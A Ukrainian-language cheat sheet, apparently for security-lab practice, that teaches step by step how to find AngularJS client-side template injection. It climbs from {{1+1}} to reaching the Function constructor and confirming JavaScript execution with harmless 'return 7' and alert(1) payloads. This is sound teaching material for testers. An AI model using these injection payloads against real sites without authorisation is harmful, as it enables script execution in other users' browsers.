# AngularJS XSS / CSTI — Cheat Sheet

> Шпаргалка з базової методології пошуку Client-Side Template Injection (CSTI) та XSS у старих AngularJS-застосунках.

> **Примітка:** конкретні способи переходу від AngularJS expression до виконання JavaScript залежать від версії AngularJS, контексту та захисних механізмів. Не існує одного універсального payload для всіх версій.

---

## 1. Знайти місце, де відображається ввід

Спочатку вводимо унікальний текст:

```text
test123
```

Потім перевіряємо, де саме він з'явився у DOM:

```html
<div>test123</div>
```

або:

```html
<input value="test123">
```

### Головне питання

> У який контекст потрапляє мій ввід?

Можливі варіанти:

- HTML context
- HTML attribute
- JavaScript context
- AngularJS expression context

---

## 2. Перевірити виконання AngularJS expression

Перший базовий тест:

```text
{{1+1}}
```

### Можливі результати

Якщо сторінка показує:

```text
{{1+1}}
```

вираз, імовірно, не обробляється AngularJS у цьому місці.

Якщо сторінка показує:

```text
2
```

AngularJS expression був обчислений.

Це може вказувати на можливу:

```text
Client-Side Template Injection (CSTI)
```

---

## 3. Перевірити доступ до властивостей

```text
{{'hello'.length}}
```

Очікуваний результат:

```text
5
```

Це підтверджує можливість доступу до властивостей:

```text
object.property
```

---

## 4. Перевірити bracket notation

Ту саму властивість можна спробувати отримати через квадратні дужки:

```text
{{'hello'['length']}}
```

Очікуваний результат:

```text
5
```

Обидва записи означають одне й те саме:

```javascript
object.property
```

```javascript
object['property']
```

### Чому bracket notation важливий?

Назву властивості можна створювати динамічно:

```text
{{'hello'['len'+'gth']}}
```

Спочатку:

```text
'len' + 'gth' → 'length'
```

Потім:

```text
'hello'['length'] → 5
```

Це може бути корисно під час дослідження фільтрації та обмежень.

---

## 5. Перевірити виклик методів

```text
{{'test'.toUpperCase()}}
```

Очікуваний результат:

```text
TEST
```

Це показує, що AngularJS expression дозволяє викликати метод:

```text
object.method()
```

---

## 6. Отримати сам об'єкт функції

Прибираємо `()`:

```text
{{'test'.toUpperCase}}
```

Можливий результат:

```javascript
function toUpperCase() { [native code] }
```

Різниця:

```text
.toUpperCase
```

Отримати сам об'єкт функції.

```text
.toUpperCase()
```

Викликати функцію.

---

## 7. Дослідити властивості функції

Функції у JavaScript також є об'єктами та можуть мати властивості.

У тестовому середовищі можна дослідити:

```text
{{'test'.toUpperCase['constructor']}}
```

Можливий результат:

```javascript
function Function() { [native code] }
```

Логіка:

```text
String
  ↓
String method
  ↓
Function object
  ↓
constructor
  ↓
Function
```

---

## 8. Перевірити механізм нешкідливим кодом

Перш ніж перевіряти XSS, корисно підтвердити механізм простим результатом:

```text
{{'test'.toUpperCase['constructor']('return 7')()}}
```

Очікуваний результат у вразливому середовищі:

```text
7
```

Концептуально це відповідає:

```javascript
Function('return 7')()
```

### Розбір

```text
['constructor']
       ↓
отримати Function

('return 7')
       ↓
створити нову функцію

()
       ↓
викликати створену функцію

7
```

---

## 9. Підтвердити XSS

Після підтвердження виконання JavaScript можна використати стандартний proof of concept відповідно до вимог лабораторії.

Важливо розуміти різницю:

```html
<script>alert(1)</script>
```

Це HTML.

А:

```javascript
alert(1)
```

Це JavaScript-код.

Якщо JavaScript передається безпосередньо до `Function(...)`, HTML-тег `<script>` не потрібен.

---

# Методологія

```text
User Input
    │
    ▼
Reflection in DOM
    │
    ▼
{{1+1}}
    │
    ├── Не обчислюється ──► дослідити інший контекст
    │
    ▼
Expression evaluates
    │
    ▼
Property access
{{'hello'.length}}
    │
    ▼
Bracket notation
{{'hello'['length']}}
    │
    ▼
Method call
{{'test'.toUpperCase()}}
    │
    ▼
Function object
{{'test'.toUpperCase}}
    │
    ▼
Explore accessible properties
    │
    ▼
Test harmless JavaScript execution
    │
    ▼
Confirm XSS
```

---

# Quick Reference

| Мета | Приклад |
|---|---|
| Перевірити expression | `{{1+1}}` |
| Доступ до властивості | `{{'hello'.length}}` |
| Bracket notation | `{{'hello'['length']}}` |
| Побудова назви властивості | `{{'hello'['len'+'gth']}}` |
| Виклик методу | `{{'test'.toUpperCase()}}` |
| Отримати функцію | `{{'test'.toUpperCase}}` |
| Дослідити constructor | `{{'test'.toUpperCase['constructor']}}` |
| Перевірити виконання коду | `{{'test'.toUpperCase['constructor']('return 7')()}}` |

---

# Основна логіка

```text
REFLECT
   ↓
{{1+1}}
   ↓
PROPERTY
   ↓
METHOD
   ↓
FUNCTION
   ↓
EXPLORE
   ↓
JAVASCRIPT EXECUTION
   ↓
XSS
```

---

## Key Insight

Якщо:

```text
{{1+1}} → 2
```

це означає, що потрібно думати не лише про звичайну HTML-ін'єкцію.

Можливий ланцюжок:

```text
User Input
    ↓
AngularJS Template
    ↓
{{ Expression }}
    ↓
AngularJS Expression Evaluation
    ↓
JavaScript Execution
    ↓
XSS
```

Головне питання:

> **Що дозволяє виконувати AngularJS expression engine у цьому конкретному контексті та версії?**

---

## Wrong Assumption

Початкова помилка:

```html
<script>alert(1)</script>
```

Не кожна XSS-вразливість потребує вставки `<script>`.

Якщо кутові дужки:

```text
< >
```

HTML-кодуються, звичайна HTML-ін'єкція може не працювати.

Однак, якщо введення обробляється AngularJS:

```text
{{...}}
```

можливий інший шлях через AngularJS expression context.

---

## Important Notes

- AngularJS expressions — це не повністю те саме, що звичайний JavaScript.
- Поведінка залежить від версії AngularJS.
- Старі версії AngularJS мали різні sandbox-механізми та відомі способи їх обходу.
- Payload, який працює в одній версії, може не працювати в іншій.
- Спочатку визначай контекст і можливості expression engine.
- Не покладайся лише на готові payload-и — досліджуй поведінку поступово.

---

## Testing Workflow

```text
1. Find user-controlled input
2. Find where the input is reflected
3. Identify the context
4. Test {{1+1}}
5. Test property access
6. Test bracket notation
7. Test method calls
8. Inspect accessible function objects
9. Explore available properties
10. Confirm harmless JavaScript execution
11. Confirm XSS according to the lab requirements
```

---

> **For educational purposes and authorized security testing only.**
